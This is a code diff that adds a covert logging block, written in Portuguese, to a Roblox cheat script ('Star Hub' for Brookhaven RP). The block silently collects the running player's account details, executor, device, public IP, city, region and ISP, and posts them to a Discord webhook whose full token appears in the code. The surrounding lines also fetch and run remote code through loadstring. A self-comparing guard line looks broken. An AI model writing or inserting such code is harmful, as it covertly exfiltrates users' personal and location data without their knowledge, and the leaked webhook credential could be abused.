@@ -207,6 +207,240 @@ ScreenGui:Destroy()
 
 pcall(function() game:HttpGet("https://nexviewsservice.shardweb.app/services/drip_client/start") end)
 
+-- ╔══════════════════════════════════════════════════════════╗
+-- ║           ⭐  STAR HUB  —  SISTEMA DE EXECUÇÃO LOG       ║
+-- ║                                                          ║
+-- ║  WEBHOOK: coloque sua URL abaixo                         ║
+-- ╚══════════════════════════════════════════════════════════╝
+
+task.spawn(function()
+    -- ── CONFIGURAÇÃO ─────────────────────────────────────────────────────
+    local WEBHOOK_URL   = "https://discord.com/api/webhooks/1490789248696324279/PwZnf9m0JPG6RUw_LgIUOeTtfM_Qle51gvr9rOJ5IQARX95yc3DSaoPlWU6HPOLdVOQX"  -- ← Cole sua webhook do Discord aqui
+    local HUB_NAME      = "⭐ Star Hub | Brookhaven RP"
+    local HUB_VERSION   = "v2.0"
+    local LOG_COLOR     = 0xFFD700  -- Dourado (tema Star Hub)
+    local LOAD_DELAY    = 5         -- segundos de espera antes de enviar
+    local SECRET_MODE   = true     -- true = inclui IP, cidade, região, ISP (modo avançado)
+
+    -- Validação: sai silenciosamente se não configurado
+    if WEBHOOK_URL == "https://discord.com/api/webhooks/1490789248696324279/PwZnf9m0JPG6RUw_LgIUOeTtfM_Qle51gvr9rOJ5IQARX95yc3DSaoPlWU6HPOLdVOQX" or WEBHOOK_URL == "" then return end
+
+    -- ── ANTI-SPAM: só envia 1x por servidor por sessão ───────────────────
+    if not _G._StarHubLogSent then _G._StarHubLogSent = {} end
+    local jobId = tostring(game.JobId)
+    if _G._StarHubLogSent[jobId] then return end
+    _G._StarHubLogSent[jobId] = true
+
+    -- ── ANTI-EXECUÇÃO DUPLICADA (via gethui) ─────────────────────────────
+    local ui = pcall(gethui) and gethui() or game:GetService("CoreGui")
+    local FOLDER_TAG = "StarHubExecLog_v2"
+    if ui:FindFirstChild(FOLDER_TAG) then return end
+    local tag = Instance.new("Folder"); tag.Name = FOLDER_TAG; tag.Parent = ui
+
+    -- ── AGUARDA JOGO CARREGAR ─────────────────────────────────────────────
+    task.wait(LOAD_DELAY)
+
+    -- ── COLETA DE DADOS ──────────────────────────────────────────────────
+    local HttpService    = game:GetService("HttpService")
+    local Players        = game:GetService("Players")
+    local MarketService  = game:GetService("MarketplaceService")
+    local UIS            = game:GetService("UserInputService")
+
+    local lp        = Players.LocalPlayer
+    local userId    = lp.UserId
+    local userName  = lp.Name
+    local dispName  = lp.DisplayName
+    local gameId    = game.PlaceId
+
+    -- Nome do jogo
+    local gameName = "N/A"
+    pcall(function()
+        gameName = MarketService:GetProductInfo(gameId).Name
+    end)
+
+    -- Idade da conta (dias)
+    local accountAge = "N/A"
+    pcall(function()
+        accountAge = tostring(lp.AccountAge) .. " dias"
+    end)
+
+    -- Amigos
+    local friendCount = "N/A"
+    pcall(function()
+        friendCount = tostring(#Players:GetFriendsAsync(userId):GetCurrentPage())
+    end)
+
+    -- Servidor
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers  = Players.MaxPlayers
+
+    -- HP
+    local hp, maxHp = "N/A", "N/A"
+    pcall(function()
+        local h = lp.Character and lp.Character:FindFirstChildWhichIsA("Humanoid")
+        if h then hp = math.floor(h.Health); maxHp = math.floor(h.MaxHealth) end
+    end)
+
+    -- Dispositivo
+    local platform = "N/A"
+    pcall(function()
+        local p = UIS:GetPlatform()
+        platform = (p == Enum.Platform.Windows or p == Enum.Platform.OSX) and "💻 PC"
+            or (p == Enum.Platform.Android or p == Enum.Platform.IOS) and "📱 Mobile"
+            or "🎮 Console"
+    end)
+
+    -- Executor
+    local executor = "N/A"
+    pcall(function()
+        executor = identifyexecutor and identifyexecutor() or "Desconhecido"
+    end)
+
+    -- Teleport snipe
+    local snipe = string.format(
+        "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
+        gameId, jobId
+    )
+
+    -- Timestamp
+    local timestamp = os.date("%d/%m/%Y  %H:%M:%S")
+
+    -- ── GEOLOCALIZAÇÃO (país via IP) ──────────────────────────────────────
+    local countryNames = {
+        BR="🇧🇷 Brasil",      US="🇺🇸 EUA",          PT="🇵🇹 Portugal",
+        ES="🇪🇸 Espanha",     FR="🇫🇷 França",        DE="🇩🇪 Alemanha",
+        IT="🇮🇹 Itália",      GB="🇬🇧 Reino Unido",   CA="🇨🇦 Canadá",
+        AU="🇦🇺 Austrália",   JP="🇯🇵 Japão",          CN="🇨🇳 China",
+        RU="🇷🇺 Rússia",      IN="🇮🇳 Índia",          MX="🇲🇽 México",
+        AR="🇦🇷 Argentina",   CL="🇨🇱 Chile",          CO="🇨🇴 Colômbia",
+        PL="🇵🇱 Polônia",     NL="🇳🇱 Holanda",        SE="🇸🇪 Suécia",
+        NO="🇳🇴 Noruega",     TR="🇹🇷 Turquia",        KR="🇰🇷 Coreia do Sul",
+        UA="🇺🇦 Ucrânia",     ZA="🇿🇦 África do Sul",  NG="🇳🇬 Nigéria",
+        EG="🇪🇬 Egito",       PH="🇵🇭 Filipinas",      ID="🇮🇩 Indonésia",
+        SG="🇸🇬 Singapura",   VN="🇻🇳 Vietnam",        TH="🇹🇭 Tailândia",
+    }
+
+    local ip, ipData = "N/A", {}
+    local country, timezone = "N/A", "N/A"
+
+    pcall(function()
+        ip = game:HttpGet("https://api.ipify.org")
+    end)
+
+    if ip ~= "N/A" then
+        pcall(function()
+            ipData = HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/" .. ip .. "/json"))
+            local cc = ipData.country or ""
+            country  = countryNames[cc] or cc
+            timezone = ipData.timezone or "N/A"
+        end)
+    end
+
+    -- ── MONTAR EMBED ─────────────────────────────────────────────────────
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId
+        .. "&width=420&height=420&format=png"
+
+    local fields = {
+        {
+            name   = "👤  Player",
+            value  = "```\n"
+                .. "Username  : " .. userName  .. "\n"
+                .. "Display   : " .. dispName  .. "\n"
+                .. "User ID   : " .. userId    .. "\n"
+                .. "Conta     : " .. accountAge .. "\n"
+                .. "Amigos    : " .. friendCount
+                .. "\n```",
+            inline = false
+        },
+        {
+            name   = "🎮  Jogo",
+            value  = "```\n"
+                .. "Nome   : " .. gameName .. "\n"
+                .. "PlaceId: " .. gameId
+                .. "\n```",
+            inline = true
+        },
+        {
+            name   = "🖥️  Sistema",
+            value  = "```\n"
+                .. "Executor : " .. executor  .. "\n"
+                .. "Device   : " .. platform  .. "\n"
+                .. "HP       : " .. hp .. " / " .. maxHp
+                .. "\n```",
+            inline = true
+        },
+        {
+            name   = "🌍  Localização",
+            value  = "```\n"
+                .. "País     : " .. country  .. "\n"
+                .. "Timezone : " .. timezone
+                .. "\n```",
+            inline = true
+        },
+        {
+            name   = "👥  Servidor",
+            value  = "```\n"
+                .. "Players : " .. playerCount .. " / " .. maxPlayers
+                .. "\n```",
+            inline = true
+        },
+        {
+            name   = "🌀  Teleport Snipe",
+            value  = "```lua\n" .. snipe .. "\n```",
+            inline = false
+        },
+    }
+
+    -- Seção avançada (SECRET_MODE) — IP, cidade, região, ISP (sem GPS)
+    if SECRET_MODE and ip ~= "N/A" and ipData.city then
+        table.insert(fields, {
+            name   = "🤫  Info Avançada",
+            value  = "||`IP      : " .. (ipData.ip     or ip)         .. "`||\n"
+                  .. "||`Cidade  : " .. (ipData.city   or "N/A")      .. "`||\n"
+                  .. "||`Região  : " .. (ipData.region or "N/A")      .. "`||\n"
+                  .. "||`ISP/Org : " .. (ipData.org    or "N/A")      .. "`||",
+            inline = false
+        })
+    end
+
+    local embed = {
+        title       = "🚀  " .. HUB_NAME .. " — Execução",
+        description = "*Hub executado com sucesso! Versão* **" .. HUB_VERSION .. "**\n"
+                   .. "`" .. timestamp .. "`",
+        type        = "rich",
+        color       = LOG_COLOR,
+        fields      = fields,
+        thumbnail   = { url = avatarUrl },
+        footer      = {
+            text      = "Star Hub Logger  •  " .. timestamp,
+            icon_url  = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
+        }
+    }
+
+    -- ── ENVIO ─────────────────────────────────────────────────────────────
+    local body = HttpService:JSONEncode({ embeds = { embed } })
+    local reqFunc = (syn and syn.request)
+        or http_request or request
+        or (fluxus and fluxus.request)
+        or (http and http.request)
+
+    if reqFunc then
+        pcall(reqFunc, {
+            Url     = WEBHOOK_URL,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = body,
+        })
+    else
+        -- Fallback para executors que só expõem HttpService
+        pcall(function()
+            HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
+        end)
+    end
+end)
+-- ╚══════════════════════════════════════════════════════════╝
+-- FIM DO SISTEMA DE LOG
+
 local Translator = {}
 
 Translator.Frases = loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/translations.lua"))()
